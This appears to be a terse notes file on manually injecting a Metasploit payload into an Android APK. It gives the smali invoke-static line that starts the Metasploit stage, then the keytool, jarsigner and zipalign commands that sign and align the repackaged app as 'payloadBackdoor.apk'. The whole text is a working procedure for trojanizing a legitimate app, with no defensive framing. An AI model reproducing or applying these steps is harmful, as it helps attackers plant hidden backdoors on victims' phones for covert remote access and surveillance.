# manualinjecapk
# manualinjecapk


## invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V




------------------------------------------------------------------------------------------------------------
# keytool -genkey -v -keystore code5.keystore -alias aliasnyapenting -keyalg RSA -keysize 2048 -validity 10000

# jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore code5.keystore payload.apk aliasnyapenting

# jarsigner -verify -verbose -certs payload.apk

# zipalign -v 4 payload.apk payloadBackdoor.apk
-------------------------------------------------------------------------------------------------------------
